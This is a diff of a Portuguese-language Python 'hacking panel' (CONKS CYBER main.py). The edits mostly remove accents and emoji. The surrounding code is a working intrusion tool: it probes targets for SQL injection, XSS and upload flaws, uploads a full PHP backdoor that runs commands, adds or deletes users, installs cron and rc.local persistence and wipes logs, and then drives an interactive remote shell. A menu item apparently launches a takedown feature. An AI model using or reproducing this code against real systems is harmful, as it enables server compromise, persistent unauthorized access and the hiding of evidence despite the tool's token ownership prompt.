@@ -1,5 +1,5 @@
 # ==========================================
-# CONKS CYBER - VERSÃO COMPLETA
+# CONKS CYBER - VERSÃO COMPLETA CORRIGIDA
 # main.py
 # ==========================================
 
@@ -234,7 +234,7 @@ class CyberInvasionReal:
     def executar_comando(self, comando):
         """Executa comando REAL no servidor via backdoor"""
         if not self.backdoor_url:
-            return "Backdoor não encontrado! Instale primeiro."
+            return "Backdoor nao encontrado! Instale primeiro."
         
         try:
             url = f"{self.backdoor_url}?cmd={urllib.parse.quote(comando)}"
@@ -264,7 +264,7 @@ class CyberInvasionReal:
             if response.getcode() == 200:
                 html = response.read().decode('utf-8', errors='ignore')
                 if "SQL" in html or "syntax" in html.lower() or "mysql" in html.lower():
-                    print(f" {RED}VULNERÁVEL!{RESET}")
+                    print(f" {RED}VULNERAVEL!{RESET}")
                     vulnerabilidades.append("SQL Injection")
                     self.dados['sql_injection'] = True
                 else:
@@ -284,7 +284,7 @@ class CyberInvasionReal:
             if response.getcode() == 200:
                 html = response.read().decode('utf-8', errors='ignore')
                 if "script" in html.lower() or "alert" in html.lower():
-                    print(f" {RED}VULNERÁVEL!{RESET}")
+                    print(f" {RED}VULNERAVEL!{RESET}")
                     vulnerabilidades.append("XSS")
                     self.dados['xss'] = True
                 else:
@@ -316,7 +316,7 @@ class CyberInvasionReal:
             )
             response = urllib.request.urlopen(req, timeout=5)
             if response.getcode() in [200, 201, 302]:
-                print(f" {RED}VULNERÁVEL!{RESET}")
+                print(f" {RED}VULNERAVEL!{RESET}")
                 vulnerabilidades.append("Upload")
                 self.dados['upload'] = True
             else:
@@ -328,7 +328,7 @@ class CyberInvasionReal:
         return vulnerabilidades
     
     # ==========================================
-    # INSTALA BACKDOOR REAL
+    # INSTALA BACKDOOR REAL (CORRIGIDO)
     # ==========================================
     
     def instalar_backdoor(self):
@@ -336,11 +336,11 @@ class CyberInvasionReal:
         print(f"\n{RED}[~] Instalando Backdoor via Upload...{RESET}")
         
         if not self.dados.get('upload'):
-            print(f"  {YELLOW}[!] Upload não detectado. Tentando outros métodos...{RESET}")
+            print(f"  {YELLOW}[!] Upload nao detectado. Tentando outros metodos...{RESET}")
         
         try:
-            # Shell PHP completo
-            shell_code = b"""<?php
+            # Shell PHP completo - AGORA SEM ACENTOS (string normal)
+            shell_php = """<?php
 // BACKDOOR COMPLETO - CONKS CYBER
 error_reporting(0);
 ini_set('display_errors', 0);
@@ -370,7 +370,7 @@ if(isset($_GET['download'])) {
     echo file_get_contents($_GET['file']);
 }
 
-// Informações do sistema
+// Informacoes do sistema
 if(isset($_GET['info'])) {
     echo '<pre>';
     echo 'Hostname: '.gethostname()."\\n";
@@ -381,7 +381,7 @@ if(isset($_GET['info'])) {
     echo '</pre>';
 }
 
-// Escanear diretórios
+// Escanear diretorios
 if(isset($_GET['scan'])) {
     $dir = $_GET['scan'] ? $_GET['scan'] : '.';
     echo '<pre>';
@@ -389,7 +389,7 @@ if(isset($_GET['scan'])) {
     echo '</pre>';
 }
 
-// Criar usuário
+// Criar usuario
 if(isset($_GET['adduser'])) {
     $user = $_GET['user'];
     $pass = $_GET['pass'];
@@ -398,13 +398,13 @@ if(isset($_GET['adduser'])) {
     echo 'Usuario '.$user.' criado!';
 }
 
-// Deletar usuário
+// Deletar usuario
 if(isset($_GET['deluser'])) {
     system('userdel -r '.$_GET['user']);
     echo 'Usuario deletado!';
 }
 
-// Instalar persistência
+// Instalar persistencia
 if(isset($_GET['persist'])) {
     $cmd = 'php '.$_SERVER['SCRIPT_FILENAME'];
     system('(crontab -l 2>/dev/null; echo "@reboot '.$cmd.'") | crontab -');
@@ -422,6 +422,9 @@ if(isset($_GET['clean'])) {
     echo 'Logs limpos!';
 }
 ?>"""
+            
+            # Converte para bytes
+            shell_code = shell_php.encode('utf-8')
             
             # Tenta fazer upload
             boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
@@ -465,9 +468,8 @@ if(isset($_GET['clean'])) {
                 except:
                     continue
             
-            # Tenta criar direto
+            # Tenta criar direto via LFI se disponível
             try:
-                # Tenta criar via LFI se disponível
                 if self.dados.get('lfi'):
                     self.executar_comando("echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell.php")
                     self.backdoor_url = f"http://{self.target}:{self.port}/shell.php"
@@ -493,11 +495,11 @@ if(isset($_GET['clean'])) {
         """Shell interativo REAL com comandos especiais"""
         
         if not self.backdoor_instalado and not self.backdoor_url:
-            print(f"\n{RED}[!] Backdoor não instalado! Instale primeiro (opção 1){RESET}")
+            print(f"\n{RED}[!] Backdoor nao instalado! Instale primeiro (opcao 1){RESET}")
             return
         
         print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
-        print(f"{PURPLE}║        🔓 SHELL INTERATIVO REAL       ║{RESET}")
+        print(f"{PURPLE}║        [SHELL INTERATIVO REAL       ║{RESET}")
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
         print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (25 - len(str(self.port))) }║{RESET}")
         print(f"{PURPLE}║ Backdoor: {self.backdoor_url[:30]}{' ' * (25) }║{RESET}")
@@ -507,10 +509,10 @@ if(isset($_GET['clean'])) {
         print(f"{PURPLE}║  /info     - Info do servidor          ║{RESET}")
         print(f"{PURPLE}║  /download - Baixa arquivo             ║{RESET}")
         print(f"{PURPLE}║  /upload   - Envia arquivo             ║{RESET}")
-        print(f"{PURPLE}║  /scan     - Escaneia diretório        ║{RESET}")
-        print(f"{PURPLE}║  /adduser  - Cria usuário              ║{RESET}")
-        print(f"{PURPLE}║  /deluser  - Deleta usuário            ║{RESET}")
-        print(f"{PURPLE}║  /persist  - Instala persistência      ║{RESET}")
+        print(f"{PURPLE}║  /scan     - Escaneia diretorio        ║{RESET}")
+        print(f"{PURPLE}║  /adduser  - Cria usuario              ║{RESET}")
+        print(f"{PURPLE}║  /deluser  - Deleta usuario            ║{RESET}")
+        print(f"{PURPLE}║  /persist  - Instala persistencia      ║{RESET}")
         print(f"{PURPLE}║  /clean    - Limpa logs                ║{RESET}")
         print(f"{PURPLE}║  /exit     - Sai da shell              ║{RESET}")
         print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
@@ -531,21 +533,21 @@ if(isset($_GET['clean'])) {
             
             elif comando.lower() == '/help':
                 print("""
-{GREEN}Comandos disponíveis:{RESET}
+{GREEN}Comandos disponiveis:{RESET}
   <comando>   - Executa qualquer comando Linux
-  /info       - Mostra informações do servidor
+  /info       - Mostra informacoes do servidor
   /download   - Baixa arquivo do servidor
   /upload     - Envia arquivo para o servidor
-  /scan       - Escaneia diretório
-  /adduser    - Cria novo usuário
-  /deluser    - Deleta usuário
-  /persist    - Instala persistência
+  /scan       - Escaneia diretorio
+  /adduser    - Cria novo usuario
+  /deluser    - Deleta usuario
+  /persist    - Instala persistencia
   /clean      - Limpa logs
   /exit       - Sai da shell
                 """)
             
             elif comando.lower() == '/info':
-                print(f"{GREEN}[+] Informações do servidor:{RESET}")
+                print(f"{GREEN}[+] Informacoes do servidor:{RESET}")
                 resultado = self.executar_comando("uname -a && whoami && pwd && hostname && ifconfig | grep inet")
                 print(f"{WHITE}{resultado}{RESET}")
             
@@ -578,7 +580,7 @@ if(isset($_GET['clean'])) {
                     continue
                 user = partes[0]
                 senha = partes[1]
-                print(f"{GREEN}[+] Criando usuário: {user}{RESET}")
+                print(f"{GREEN}[+] Criando usuario: {user}{RESET}")
                 resultado = self.executar_comando(f"useradd -m -s /bin/bash {user} && echo '{user}:{senha}' | chpasswd")
                 print(f"{WHITE}{resultado}{RESET}")
                 self.usuarios_criados.append(user)
@@ -589,14 +591,14 @@ if(isset($_GET['clean'])) {
                     print(f"{RED}[-] Uso: /deluser usuario{RESET}")
                     continue
                 if user == "root":
-                    print(f"{RED}[-] Não pode deletar o root!{RESET}")
+                    print(f"{RED}[-] Nao pode deletar o root!{RESET}")
                     continue
-                print(f"{GREEN}[+] Deletando usuário: {user}{RESET}")
+                print(f"{GREEN}[+] Deletando usuario: {user}{RESET}")
                 resultado = self.executar_comando(f"userdel -r {user}")
                 print(f"{WHITE}{resultado}{RESET}")
             
             elif comando.lower() == '/persist':
-                print(f"{GREEN}[+] Instalando persistência...{RESET}")
+                print(f"{GREEN}[+] Instalando persistencia...{RESET}")
                 resultado = self.executar_comando("(crontab -l 2>/dev/null; echo '@reboot php /var/www/html/uploads/shell.php') | crontab -")
                 resultado += self.executar_comando("echo 'php /var/www/html/uploads/shell.php &' >> /etc/rc.local")
                 print(f"{WHITE}{resultado}{RESET}")
@@ -647,7 +649,7 @@ if(isset($_GET['clean'])) {
         """Envia arquivo REAL para o servidor"""
         try:
             if not os.path.exists(local):
-                print(f"{RED}[-] Arquivo local não encontrado: {local}{RESET}")
+                print(f"{RED}[-] Arquivo local nao encontrado: {local}{RESET}")
                 return False
             
             with open(local, 'rb') as f:
@@ -677,14 +679,14 @@ if(isset($_GET['clean'])) {
     def scan_completo(self):
         """Scan completo do alvo"""
         print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
-        print(f"{PURPLE}║        🔍 SCAN COMPLETO               ║{RESET}")
+        print(f"{PURPLE}║        [SCAN COMPLETO               ║{RESET}")
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
         print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (28 - len(str(self.port))) }║{RESET}")
         print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
         
         # Verifica backdoor existente
         if self.verificar_backdoor():
-            print(f"\n{GREEN}[+] Backdoor já existe! Usando: {self.backdoor_url}{RESET}")
+            print(f"\n{GREEN}[+] Backdoor ja existe! Usando: {self.backdoor_url}{RESET}")
             return []
         
         # Detecta vulnerabilidades
@@ -699,7 +701,7 @@ if(isset($_GET['clean'])) {
         print(f"{PURPLE}║        VULNERABILIDADES ENCONTRADAS    ║{RESET}")
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
         for vuln in vulnerabilidades:
-            print(f"{PURPLE}║ {RED}⚠️  {vuln}{' ' * (37 - len(vuln))}{PURPLE}║{RESET}")
+            print(f"{PURPLE}║ {RED}[!]  {vuln}{' ' * (37 - len(vuln))}{PURPLE}║{RESET}")
         print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
         
         return vulnerabilidades
@@ -713,16 +715,16 @@ def cyber_invasion():
     """Cyber Invasion REAL com persistência e menu completo"""
     
     print("\n╔══════════════════════════════════════════╗")
-    print("║       🚀 CYBER INVASION REAL          ║")
+    print("║       [CYBER INVASION REAL          ║")
     print("╠══════════════════════════════════════════╣")
     print("║     FUNCIONA DE VERDADE!                ║")
     print("║     CONTROLE TOTAL DO SERVIDOR         ║")
-    print("║     APENAS EM SERVIDORES PRÓPRIOS!     ║")
+    print("║     APENAS EM SERVIDORES PROPIOS!     ║")
     print("╚══════════════════════════════════════════╝")
     
-    print("\n[~] Digite o alvo da invasão:")
+    print("\n[~] Digite o alvo da invasao:")
     print("[1] IP Local (ex: 127.0.0.1)")
-    print("[2] Site/Domínio próprio")
+    print("[2] Site/Dominio proprio")
     print("[3] Voltar")
     
     opcao = input("\nEscolha: ").strip()
@@ -738,12 +740,12 @@ def cyber_invasion():
         alvo = input("\nDigite o site: ").strip()
         alvo = alvo.replace("http://", "").replace("https://", "").split("/")[0]
     else:
-        print("[-] Opção inválida.")
+        print("[-] Opcao invalida.")
         input("\nPressione ENTER para continuar...")
         return
     
     if not alvo:
-        print("[-] Alvo inválido.")
+        print("[-] Alvo invalido.")
         input("\nPressione ENTER para continuar...")
         return
     
@@ -754,23 +756,23 @@ def cyber_invasion():
     
     # AVISO LEGAL
     print(f"\n{RED}{BOLD}╔══════════════════════════════════════════╗{RESET}")
-    print(f"{RED}{BOLD}║        ⚠️  AVISO LEGAL ⚠️               ║{RESET}")
+    print(f"{RED}{BOLD}║        [AVISO LEGAL                ║{RESET}")
     print(f"{RED}{BOLD}╠══════════════════════════════════════════╣{RESET}")
-    print(f"{RED}║  • Você está prestes a INVADIR {alvo}   ║{RESET}")
-    print(f"{RED}║  • Isso só é PERMITIDO em servidores     ║{RESET}")
-    print(f"{RED}║    que você POSSUI ou tem AUTORIZAÇÃO!   ║{RESET}")
-    print(f"{RED}║  • Invadir sistemas alheios é CRIME!     ║{RESET}")
-    print(f"{RED}║  • Pena: 1-4 anos de reclusão           ║{RESET}")
+    print(f"{RED}║  • Voce esta prestes a INVADIR {alvo}   ║{RESET}")
+    print(f"{RED}║  • Isso so e PERMITIDO em servidores     ║{RESET}")
+    print(f"{RED}║    que voce POSSUI ou tem AUTORIZACAO!   ║{RESET}")
+    print(f"{RED}║  • Invadir sistemas alheios e CRIME!     ║{RESET}")
+    print(f"{RED}║  • Pena: 1-4 anos de reclusao           ║{RESET}")
     print(f"{RED}{BOLD}╚══════════════════════════════════════════╝{RESET}")
     
-    confirm = input(f"\n{RED}Confirma que {alvo} é seu servidor próprio? (s/N): {RESET}").strip().lower()
+    confirm = input(f"\n{RED}Confirma que {alvo} e seu servidor proprio? (s/N): {RESET}").strip().lower()
     
     if confirm != 's':
-        print("[-] Invasão cancelada.")
+        print("[-] Invasao cancelada.")
         input("\nPressione ENTER para continuar...")
         return
     
-    # INICIA INVASÃO
+    # INICIA INVASAO
     invasor = CyberInvasionReal(alvo, porta)
     
     # VERIFICA BACKDOOR EXISTENTE
@@ -778,9 +780,9 @@ def cyber_invasion():
     if invasor.verificar_backdoor():
         print(f"  {GREEN}[+] Backdoor encontrado: {invasor.backdoor_url}{RESET}")
     else:
-        print(f"  {YELLOW}[!] Backdoor não encontrado. Será necessário instalar.{RESET}")
+        print(f"  {YELLOW}[!] Backdoor nao encontrado. Sera necessario instalar.{RESET}")
     
-    # SCAN (se não tiver backdoor)
+    # SCAN (se nao tiver backdoor)
     if not invasor.backdoor_instalado:
         vulnerabilidades = invasor.scan_completo()
         
@@ -795,23 +797,23 @@ def cyber_invasion():
     
     while True:
         print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
-        print(f"{PURPLE}║        🚀 CYBER INVASION               ║{RESET}")
+        print(f"{PURPLE}║        [CYBER INVASION               ║{RESET}")
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
         
         # Status
         if invasor.backdoor_instalado:
-            print(f"{GREEN}║ ✅ Backdoor: INSTALADO                 ║{RESET}")
-            print(f"{GREEN}║ 📍 URL: {invasor.backdoor_url[:35]}{' ' * (20) }║{RESET}")
+            print(f"{GREEN}║ [OK] Backdoor: INSTALADO                 ║{RESET}")
+            print(f"{GREEN}║ [URL] {invasor.backdoor_url[:35]}{' ' * (20) }║{RESET}")
         else:
-            print(f"{RED}║ ❌ Backdoor: NÃO INSTALADO             ║{RESET}")
+            print(f"{RED}║ [XX] Backdoor: NAO INSTALADO             ║{RESET}")
         
         if invasor.persistencia_ativa:
-            print(f"{GREEN}║ 🔒 Persistência: ATIVA                ║{RESET}")
+            print(f"{GREEN}║ [OK] Persistencia: ATIVA                ║{RESET}")
         else:
-            print(f"{YELLOW}║ 🔒 Persistência: INATIVA              ║{RESET}")
+            print(f"{YELLOW}║ [!!] Persistencia: INATIVA              ║{RESET}")
         
         if invasor.logs_limpos:
-            print(f"{GREEN}║ 🧹 Logs: LIMPOS                       ║{RESET}")
+            print(f"{GREEN}║ [OK] Logs: LIMPOS                       ║{RESET}")
         
         print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
         print(f"{PURPLE}║ [1] Instalar Backdoor                   ║{RESET}")
@@ -819,10 +821,10 @@ def cyber_invasion():
         print(f"{PURPLE}║ [3] Executar Comando                    ║{RESET}")
         print(f"{PURPLE}║ [4] Baixar Arquivo                      ║{RESET}")
         print(f"{PURPLE}║ [5] Enviar Arquivo                      ║{RESET}")
-        print(f"{PURPLE}║ [6] Gerenciar Usuários                  ║{RESET}")
-        print(f"{PURPLE}║ [7] Instalar Persistência               ║{RESET}")
+        print(f"{PURPLE}║ [6] Gerenciar Usuarios                  ║{RESET}")
+        print(f"{PURPLE}║ [7] Instalar Persistencia               ║{RESET}")
         print(f"{PURPLE}║ [8] Limpar Rastros                      ║{RESET}")
-        print(f"{PURPLE}║ [9] Informações do Servidor             ║{RESET}")
+        print(f"{PURPLE}║ [9] Informacoes do Servidor             ║{RESET}")
         print(f"{PURPLE}║ [10] Sair                               ║{RESET}")
         print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
         
@@ -841,7 +843,7 @@ def cyber_invasion():
         
         elif sub_opcao == "3":
             if not invasor.backdoor_instalado:
-                print(f"\n{RED}[!] Backdoor não instalado! Instale primeiro (opção 1){RESET}")
+                print(f"\n{RED}[!] Backdoor nao instalado! Instale primeiro (opcao 1){RESET}")
                 input("\nPressione ENTER para continuar...")
                 continue
             
@@ -853,7 +855,7 @@ def cyber_invasion():
         
         elif sub_opcao == "4":
             if not invasor.backdoor_instalado:
-                print(f"\n{RED}[!] Backdoor não instalado! Instale primeiro (opção 1){RESET}")
+                print(f"\n{RED}[!] Backdoor nao instalado! Instale primeiro (opcao 1){RESET}")
                 input("\nPressione ENTER para continuar...")
                 continue
             
@@ -864,7 +866,7 @@ def cyber_invasion():
         
         elif sub_opcao == "5":
             if not invasor.backdoor_instalado:
-                print(f"\n{RED}[!] Backdoor não instalado! Instale primeiro (opção 1){RESET}")
+                print(f"\n{RED}[!] Backdoor nao instalado! Instale primeiro (opcao 1){RESET}")
                 input("\nPressione ENTER para continuar...")
                 continue
             
@@ -876,16 +878,16 @@ def cyber_invasion():
         
         elif sub_opcao == "6":
             if not invasor.backdoor_instalado:
-                print(f"\n{RED}[!] Backdoor não instalado! Instale primeiro (opção 1){RESET}")
+                print(f"\n{RED}[!] Backdoor nao instalado! Instale primeiro (opcao 1){RESET}")
                 input("\nPressione ENTER para continuar...")
                 continue
             
             print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
-            print(f"{PURPLE}║        GERENCIAR USUÁRIOS           ║{RESET}")
+            print(f"{PURPLE}║        GERENCIAR USUARIOS           ║{RESET}")
             print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
-            print(f"{PURPLE}║ [1] Listar usuários                ║{RESET}")
-            print(f"{PURPLE}║ [2] Criar usuário                  ║{RESET}")
-            print(f"{PURPLE}║ [3] Deletar usuário                ║{RESET}")
+            print(f"{PURPLE}║ [1] Listar usuarios                ║{RESET}")
+            print(f"{PURPLE}║ [2] Criar usuario                  ║{RESET}")
+            print(f"{PURPLE}║ [3] Deletar usuario                ║{RESET}")
             print(f"{PURPLE}║ [4] Voltar                         ║{RESET}")
             print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
             
@@ -893,37 +895,37 @@ def cyber_invasion():
             
             if user_opcao == "1":
                 resultado = invasor.executar_comando("cat /etc/passwd | cut -d: -f1")
-                print(f"{GREEN}[+] Usuários do sistema:{RESET}")
+                print(f"{GREEN}[+] Usuarios do sistema:{RESET}")
                 for linha in resultado.split('\n'):
                     if linha:
                         print(f"  {WHITE}{linha}{RESET}")
                 input("\nPressione ENTER para continuar...")
             
             elif user_opcao == "2":
-                nome = input(f"{GRAY}nome do usuário> {RESET}")
+                nome = input(f"{GRAY}nome do usuario> {RESET}")
                 senha = input(f"{GRAY}senha> {RESET}")
                 if nome and senha:
                     resultado = invasor.executar_comando(f"useradd -m -s /bin/bash {nome} && echo '{nome}:{senha}' | chpasswd")
-                    print(f"{GREEN}[+] Usuário criado: {nome}{RESET}")
+                    print(f"{GREEN}[+] Usuario criado: {nome}{RESET}")
                     invasor.usuarios_criados.append(nome)
                 input("\nPressione ENTER para continuar...")
             
             elif user_opcao == "3":
-                nome = input(f"{GRAY}nome do usuário> {RESET}")
+                nome = input(f"{GRAY}nome do usuario> {RESET}")
                 if nome and nome != "root":
                     resultado = invasor.executar_comando(f"userdel -r {nome}")
-                    print(f"{GREEN}[+] Usuário deletado: {nome}{RESET}")
+                    print(f"{GREEN}[+] Usuario deletado: {nome}{RESET}")
                 else:
-                    print(f"{RED}[-] Não pode deletar o root!{RESET}")
+                    print(f"{RED}[-] Nao pode deletar o root!{RESET}")
                 input("\nPressione ENTER para continuar...")
         
         elif sub_opcao == "7":
             if not invasor.backdoor_instalado:
-                print(f"\n{RED}[!] Backdoor não instalado! Instale primeiro (opção 1){RESET}")
+                print(f"\n{RED}[!] Backdoor nao instalado! Instale primeiro (opcao 1){RESET}")
                 input("\nPressione ENTER para continuar...")
                 continue
             
-            print(f"{GREEN}[+] Instalando persistência...{RESET}")
+            print(f"{GREEN}[+] Instalando persistencia...{RESET}")
             resultado = invasor.executar_comando("(crontab -l 2>/dev/null; echo '@reboot php /var/www/html/uploads/shell.php') | crontab -")
             resultado += invasor.executar_comando("echo 'php /var/www/html/uploads/shell.php &' >> /etc/rc.local")
             print(f"{WHITE}{resultado}{RESET}")
@@ -932,7 +934,7 @@ def cyber_invasion():
         
         elif sub_opcao == "8":
             if not invasor.backdoor_instalado:
-                print(f"\n{RED}[!] Backdoor não instalado! Instale primeiro (opção 1){RESET}")
+                print(f"\n{RED}[!] Backdoor nao instalado! Instale primeiro (opcao 1){RESET}")
                 input("\nPressione ENTER para continuar...")
                 continue
             
@@ -944,11 +946,11 @@ def cyber_invasion():
         
         elif sub_opcao == "9":
             if not invasor.backdoor_instalado:
-                print(f"\n{RED}[!] Backdoor não instalado! Instale primeiro (opção 1){RESET}")
+                print(f"\n{RED}[!] Backdoor nao instalado! Instale primeiro (opcao 1){RESET}")
                 input("\nPressione ENTER para continuar...")
                 continue
             
-            print(f"{GREEN}[+] Informações do servidor:{RESET}")
+            print(f"{GREEN}[+] Informacoes do servidor:{RESET}")
             info = invasor.executar_comando("uname -a && echo '' && whoami && echo '' && pwd && echo '' && hostname && echo '' && ifconfig | grep inet")
             print(f"{WHITE}{info}{RESET}")
             input("\nPressione ENTER para continuar...")
@@ -958,7 +960,7 @@ def cyber_invasion():
             break
         
         else:
-            print("[-] Opção inválida")
+            print("[-] Opcao invalida")
             input("\nPressione ENTER para continuar...")
 
 
@@ -973,7 +975,7 @@ def atualizar_painel():
     linha_caixa("CONKS CYBER UPDATE SYSTEM", WHITE, True)
     linha_caixa("")
     fim_caixa()
-    print(f"\n{BLUE}[~] Verificando atualizações...{RESET}")
+    print(f"\n{BLUE}[~] Verificando atualizacoes...{RESET}")
     time.sleep(0.5)
     
     try:
@@ -986,7 +988,7 @@ def atualizar_painel():
         saida = resultado.stdout + resultado.stderr
         
         if resultado.returncode != 0:
-            print(f"\n{RED}[-] Não foi possível atualizar o painel.{RESET}")
+            print(f"\n{RED}[-] Nao foi possivel atualizar o painel.{RESET}")
             if saida.strip():
                 print(f"\n{GRAY}{saida.strip()}{RESET}")
             input("\nPressione ENTER para voltar...")
@@ -996,14 +998,14 @@ def atualizar_painel():
             print()
             print(f"{YELLOW}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
             linha_caixa("PAINEL ATUALIZADO", YELLOW, True)
-            linha_caixa("O painel está na versão mais recente.", YELLOW)
+            linha_caixa("O painel esta na versao mais recente.", YELLOW)
             print(f"{YELLOW}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
             input("\nPressione ENTER para voltar...")
             return
         
         print()
         print(f"{GREEN}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
-        linha_caixa("ATUALIZAÇÃO CONCLUÍDA!", GREEN, True)
+        linha_caixa("ATUALIZACAO CONCLUIDA!", GREEN, True)
         linha_caixa("O painel foi atualizado.", GREEN)
         print(f"{GREEN}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
         print(f"\n{BLUE}[~] Reiniciando o painel...{RESET}")
@@ -1024,8 +1026,8 @@ def menu_rede():
         limpar_tela()
         banner()
         topo_caixa("REDE")
-        linha_caixa("[1] Meu IP público")
-        linha_caixa("[2] Testar conexão")
+        linha_caixa("[1] Meu IP publico")
+        linha_caixa("[2] Testar conexao")
         linha_caixa("")
         linha_caixa("[0] Voltar", RED, True)
         fim_caixa()
@@ -1039,7 +1041,7 @@ def menu_rede():
         elif opcao == "0":
             break
         else:
-            erro("Opção inválida.")
+            erro("Opcao invalida.")
         
         if opcao != "0":
             input("\nPressione ENTER para continuar...")
@@ -1061,8 +1063,8 @@ def menu_principal():
         linha_caixa("[4] Rede")
         linha_caixa("[5] Validadores")
         linha_caixa("[6] Utilidades")
-        linha_caixa("[7] ⚡ Shoot Down", RED, True)
-        linha_caixa("[8] 🚀 Cyber Invasion", PURPLE, True)
+        linha_caixa("[7] [Shoot Down", RED, True)
+        linha_caixa("[8] [Cyber Invasion", PURPLE, True)
         linha_caixa("[9] Atualizar painel", BLUE, True)
         linha_caixa("")
         linha_caixa("[0] Sair", RED, True)
@@ -1087,7 +1089,7 @@ def menu_principal():
                 from modules.validators import menu_validadores
                 menu_validadores()
             except ImportError:
-                erro("Módulo de validadores não encontrado.")
+                erro("Modulo de validadores nao encontrado.")
                 input("\nPressione ENTER para continuar...")
         elif opcao == "6":
             limpar_tela()
@@ -1095,7 +1097,7 @@ def menu_principal():
                 from modules.utilities import menu_utilidades
                 menu_utilidades()
             except ImportError:
-                erro("Módulo de utilidades não encontrado.")
+                erro("Modulo de utilidades nao encontrado.")
                 input("\nPressione ENTER para continuar...")
         elif opcao == "7":
             limpar_tela()
@@ -1103,7 +1105,7 @@ def menu_principal():
                 from modules.consultas import derrubar_geral
                 derrubar_geral()
             except ImportError:
-                erro("Função Shoot Down não encontrada.")
+                erro("Funcao Shoot Down nao encontrada.")
                 input("\nPressione ENTER para continuar...")
         elif opcao == "8":
             limpar_tela()
@@ -1118,7 +1120,7 @@ def menu_principal():
             print(f"{RED}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}\n")
             sys.exit(0)
         else:
-            erro("Opção inválida.")
+            erro("Opcao invalida.")
             input("\nPressione ENTER para continuar...")
 
 
